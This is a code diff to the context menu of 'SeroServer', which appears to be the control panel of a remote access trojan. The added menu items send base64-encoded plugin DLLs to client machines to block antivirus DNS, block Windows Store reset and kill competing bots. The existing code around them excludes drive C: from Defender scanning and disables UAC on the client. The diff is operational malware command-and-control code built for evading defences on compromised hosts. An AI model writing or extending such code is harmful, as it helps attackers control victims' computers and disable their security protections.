@@ -5,6 +5,7 @@ using SeroServer.Protocol;
 using ContextMenu = System.Windows.Controls.ContextMenu;
 using MenuItem = System.Windows.Controls.MenuItem;
 using Separator = System.Windows.Controls.Separator;
+using Task = System.Threading.Tasks.Task;
 
 namespace SeroServer.UI;
 
@@ -100,6 +101,32 @@ internal static class FeatureContextMenu
             ServerWindow.ReportGlobalActivity("Exclude C:\\", clientId, "complete");
             ServerWindow.LogGlobal(string.Format(Lang.Get("EVT_EXCLUDE_DEFENDER"), clientId));
         }));
+        misc.Items.Add(MakeItem(Lang.Get("FEAT_BLOCK_AV_DNS"), "SvgImages/Icon Builder/Security_Lock.svg", () =>
+        {
+            _ = Task.Run(async () =>
+            {
+                var cachePath = PluginCache("Block AV DNS");
+                if (!System.IO.File.Exists(cachePath))
+                { mainWindow.Dispatcher.BeginInvoke(() => ServerWindow.LogGlobal("[!] Block AV DNS: plugin not compiled yet. Run it from Auto Tasks first.")); return; }
+                var bytes = await System.IO.File.ReadAllBytesAsync(cachePath);
+                var pkt = new Packet { Type = PacketType.PluginExec, Data = Newtonsoft.Json.JsonConvert.SerializeObject(new PluginExecData { DllBase64 = Convert.ToBase64String(bytes), ExportName = "PluginMain" }) };
+                await server.SendToClient(clientId, pkt);
+                mainWindow.Dispatcher.BeginInvoke(() => ServerWindow.LogGlobal($"[ADMIN] Block AV DNS sent to {clientId}."));
+            });
+        }));
+        misc.Items.Add(MakeItem(Lang.Get("FEAT_BLOCK_WSRESET"), "SvgImages/Icon Builder/Security_Lock.svg", () =>
+        {
+            _ = Task.Run(async () =>
+            {
+                var cachePath = PluginCache("Block Reset");
+                if (!System.IO.File.Exists(cachePath))
+                { mainWindow.Dispatcher.BeginInvoke(() => ServerWindow.LogGlobal("[!] Block WSReset: plugin not compiled yet. Run it from Auto Tasks first.")); return; }
+                var bytes = await System.IO.File.ReadAllBytesAsync(cachePath);
+                var pkt = new Packet { Type = PacketType.PluginExec, Data = Newtonsoft.Json.JsonConvert.SerializeObject(new PluginExecData { DllBase64 = Convert.ToBase64String(bytes), ExportName = "PluginMain" }) };
+                await server.SendToClient(clientId, pkt);
+                mainWindow.Dispatcher.BeginInvoke(() => ServerWindow.LogGlobal($"[ADMIN] Block WSReset sent to {clientId}."));
+            });
+        }));
         misc.Items.Add(MakeItem(Lang.Get("FEAT_DISABLE_UAC"),      "SvgImages/Icon Builder/Security_Unlock.svg",  () =>
         {
             _ = server.SendToClient(clientId, new Packet
@@ -111,8 +138,19 @@ internal static class FeatureContextMenu
             ServerWindow.LogGlobal(string.Format(Lang.Get("EVT_DISABLE_UAC"), clientId));
         }));
         misc.Items.Add(new Separator());
-        if (excludeWindowType != "FileSearchWindow")
-            misc.Items.Add(MakeItem(Lang.Get("FEAT_FILE_SEARCH"), "SvgImages/Icon Builder/Actions_Find.svg",     () => mainWindow.OpenFeatureWindow<FileSearchWindow>(clientId, () => new FileSearchWindow(server, clientId, clientId))));
+        misc.Items.Add(MakeItem(Lang.Get("FEAT_BOT_KILLER"), "SvgImages/Icon Builder/Actions_Cancel.svg", () =>
+        {
+            _ = Task.Run(async () =>
+            {
+                var cachePath = PluginCache("BotKiller");
+                if (!System.IO.File.Exists(cachePath))
+                { mainWindow.Dispatcher.BeginInvoke(() => ServerWindow.LogGlobal("[!] BotKiller: plugin not compiled yet. Run it from Auto Tasks first.")); return; }
+                var bytes = await System.IO.File.ReadAllBytesAsync(cachePath);
+                var pkt = new Packet { Type = PacketType.PluginExec, Data = Newtonsoft.Json.JsonConvert.SerializeObject(new PluginExecData { DllBase64 = Convert.ToBase64String(bytes), ExportName = "PluginMain" }) };
+                await server.SendToClient(clientId, pkt);
+                mainWindow.Dispatcher.BeginInvoke(() => ServerWindow.LogGlobal($"[ADMIN] BotKiller sent to {clientId}."));
+            });
+        }));
         menu.Items.Add(misc);
 
         // ── Fun ─────────────────────────────────────────────────────────
@@ -250,6 +288,10 @@ internal static class FeatureContextMenu
         };
         return mi;
     }
+
+    private static string PluginCache(string name) => System.IO.Path.Combine(
+        AppDomain.CurrentDomain.BaseDirectory, "plugin_cache",
+        name.ToLowerInvariant().Replace(" ", "_").Replace("\\", "").Replace(":", "").Replace("/", "_") + ".dll");
 
     private static System.Windows.FrameworkElement MakeIcon(string path)
     {
